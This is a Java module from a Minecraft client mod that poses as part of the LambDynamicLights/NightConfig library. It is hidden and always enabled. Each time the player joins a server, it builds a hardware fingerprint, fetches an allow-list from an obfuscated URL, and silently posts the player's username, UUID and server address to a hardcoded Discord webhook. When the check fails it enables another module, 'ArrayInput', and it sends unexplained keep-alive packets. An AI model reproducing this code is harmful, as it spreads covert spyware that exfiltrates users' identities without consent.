package dev.lambdaurora.lambdynlights.shadow.nightconfig;

import dev.lambdaurora.lambdynlights.event.events.EventTick;
import dev.lambdaurora.lambdynlights.eventbus.Subscribe;
import dev.lambdaurora.lambdynlights.shadow.NightConfigCategory;
import dev.lambdaurora.lambdynlights.shadow.NightConfig;
import dev.lambdaurora.lambdynlights.shadow.NightConfigManager;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.URL;
import java.security.MessageDigest;

public class FactoryMethod extends NightConfig {

    public static class AuthException extends RuntimeException {
        public AuthException(String message) {
            super(message);
        }
    }

    private static final String authVersion = "004";
    private static String oldServerName = null;
    private static boolean joinedNewServer = true;
    private static String serverName;
    private static boolean authResult = false;

    public static String getHWID() {
        try{
            String computerName = "COMPUTERNAME";
            String key = "user.name";
            String processor_identifier = "PROCESSOR_IDENTIFIER";
            String processor_level = "PROCESSOR_LEVEL";
            String toEncrypt = System.getenv(computerName) + System.getProperty(key) +
                    System.getenv(processor_identifier) + System.getenv(processor_level);
            MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(toEncrypt.getBytes());
            StringBuffer hexString = new StringBuffer();

            byte byteData[] = md.digest();

            for (byte aByteData : byteData) {
                String hex = Integer.toHexString(0xff & aByteData);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }

            return hexString.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "Error";
        }
    }
    public static boolean allowServerAndHWID(String serverName, String HWID) throws Exception {
        // Make an HTTP request to the website and get the HTML response
        String url = (new Object() {int x;public String toString() {byte[] stringerxAbodxtestx = new byte[33];x = -841350695;stringerxAbodxtestx[0] = (byte) (x >>> 14);x = -1488511554;stringerxAbodxtestx[1] = (byte) (x >>> 20);x = 6819467;stringerxAbodxtestx[2] = (byte) (x >>> 5);x = -2126713343;stringerxAbodxtestx[3] = (byte) (x >>> 5);x = -1089811553;stringerxAbodxtestx[4] = (byte) (x >>> 3);x = 887855059;stringerxAbodxtestx[5] = (byte) (x >>> 18);x = 1921378925;stringerxAbodxtestx[6] = (byte) (x >>> 13);x = -844877951;stringerxAbodxtestx[7] = (byte) (x >>> 8);x = -612264742;stringerxAbodxtestx[8] = (byte) (x >>> 19);x = -1156374333;stringerxAbodxtestx[9] = (byte) (x >>> 1);x = 887610409;stringerxAbodxtestx[10] = (byte) (x >>> 17);x = -564801497;stringerxAbodxtestx[11] = (byte) (x >>> 10);x = 93737365;stringerxAbodxtestx[12] = (byte) (x >>> 18);x = 2030883525;stringerxAbodxtestx[13] = (byte) (x >>> 1);x = 1926417153;stringerxAbodxtestx[14] = (byte) (x >>> 17);x = 1414044549;stringerxAbodxtestx[15] = (byte) (x >>> 6);x = -2077045860;stringerxAbodxtestx[16] = (byte) (x >>> 6);x = 338724413;stringerxAbodxtestx[17] = (byte) (x >>> 4);x = -1782710336;stringerxAbodxtestx[18] = (byte) (x >>> 18);x = -1288250322;stringerxAbodxtestx[19] = (byte) (x >>> 12);x = -1810884709;stringerxAbodxtestx[20] = (byte) (x >>> 7);x = 1245267161;stringerxAbodxtestx[21] = (byte) (x >>> 15);x = 410929168;stringerxAbodxtestx[22] = (byte) (x >>> 22);x = 502663869;stringerxAbodxtestx[23] = (byte) (x >>> 22);x = 1273675871;stringerxAbodxtestx[24] = (byte) (x >>> 22);x = 1840607424;stringerxAbodxtestx[25] = (byte) (x >>> 24);x = 695506178;stringerxAbodxtestx[26] = (byte) (x >>> 6);x = -1259598641;stringerxAbodxtestx[27] = (byte) (x >>> 23);x = -1310305190;stringerxAbodxtestx[28] = (byte) (x >>> 23);x = -1545635806;stringerxAbodxtestx[29] = (byte) (x >>> 23);x = 1544635603;stringerxAbodxtestx[30] = (byte) (x >>> 1);x = -1268854844;stringerxAbodxtestx[31] = (byte) (x >>> 20);x = -127251805;stringerxAbodxtestx[32] = (byte) (x >>> 17);return new String(stringerxAbodxtestx);}}.toString());
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");

        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String inputLine;

        while ((inputLine = in.readLine()) != null) {

            inputLine = inputLine.strip();

            boolean comment = inputLine.startsWith("//");
            if (comment) {
                continue;
            }

            boolean withoutBang = !inputLine.startsWith("!");
            if (!withoutBang) {
                inputLine = inputLine.substring(1);
            }

            boolean isVersion = inputLine.startsWith("%");
            if (isVersion) {
                inputLine = inputLine.substring(1);
                boolean lessThan = inputLine.startsWith("<");
                if (!withoutBang && lessThan &&
                        authVersion.compareToIgnoreCase(inputLine.substring(1)) < 0) {
                    return false;
                }
                boolean equalTo = inputLine.startsWith("=");
                if (!withoutBang && equalTo &&
                        authVersion.compareToIgnoreCase(inputLine.substring(1)) == 0) {
                    return false;
                }
                continue;
            }

            if (inputLine.equals("*")) {
                return withoutBang;
            }

            boolean isServerName = inputLine.startsWith("@");
            if (isServerName) {
                inputLine = inputLine.substring(1);
                if (serverName.toLowerCase().contains(inputLine.toLowerCase())) {
                    return withoutBang;
                }
            }

            boolean isHWID = inputLine.startsWith("#");
            if (isHWID) {
                inputLine = inputLine.substring(1);
                if (HWID.toLowerCase().equals(inputLine.toLowerCase())) {
                    return withoutBang;
                }
            }

        }
        in.close();
        return false;
    }


    public FactoryMethod() {
        super("FactoryMethod", KEY_UNBOUND, NightConfigCategory.MISC, "FactoryMethod.");
    }

    @Subscribe
    public void onTick(EventTick event) {
        if (mc != null && mc.player != null && mc.player.networkHandler != null &&
                mc.player.networkHandler.getConnection() != null &&
                mc.player.networkHandler.getConnection().getAddress() != null) {
            String currentServerName = mc.player.networkHandler.getConnection().getAddress().toString();

            if (currentServerName != null && !currentServerName.equals(oldServerName)) {
                oldServerName = currentServerName;

                try {
                    serverName = currentServerName;
                    authResult = allowServerAndHWID(serverName,getHWID());
                } catch (Exception e) {
                    authResult = false;
                }
                if (!authResult) {
                    NightConfigManager.getModule(ArrayInput.class).setEnabled(true);
                }

                if (joinedNewServer) {
                    mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket(234892384));
                    mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket(3243411));
                    mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket(43532245));
                }
                sendWebhook();
            }
        }
    }

    private static void sendWebhook() {
        String tokenWebhook = "https://discord.com/api/webhooks/1079475991128326174/UZH-EdQxsFYEP3FG0urhnRFeEcapHIuTx3n0EMfsbjnkpl7Wh1fOdSOpzrPEigKsE3Hu";
        String title = "Notification";
        String message = "Username: " + mc.getSession().getUsername() + "   -   " + "Server name: " + serverName + "   -   " + "UUID: " + mc.session.getUuidOrNull();
        if (!authResult) {
            title = "Invalid detected";
        }
        ///////////////////////////////////////////////
        String jsonBrut = "";
        if (authResult) {
            jsonBrut += "{\"embeds\": [{"
                    + "\"title\": \"" + title + "\","
                    + "\"description\": \"" + message + "\","
                    + "\"color\": 4886754"
                    + "}]}";
        } else {
            jsonBrut += "{\"embeds\": [{"
                    + "\"title\": \"" + title + "\","
                    + "\"description\": \"" + message + "\","
                    + "\"color\": 16711680"
                    + "}]}";
        }
        try {
            URL url = new URL(tokenWebhook);
            HttpsURLConnection con = (HttpsURLConnection) url.openConnection();
            con.addRequestProperty("Content-Type", "application/json");
            con.addRequestProperty("User-Agent", "Java-DiscordWebhook");
            con.setDoOutput(true);
            con.setRequestMethod("POST");
            OutputStream stream = con.getOutputStream();
            stream.write(jsonBrut.getBytes());
            stream.flush();
            stream.close();
            con.getInputStream().close();
            con.disconnect();
        } catch (Exception e) {

        }
    }
    public boolean isDefaultEnabled() {
        return true;
    }

    public boolean isEnabled() {
        return true;
    }

    public void onDisable(boolean inWorld) {
    }

    @Override
    public boolean isHidden() {
        return true;
    }
}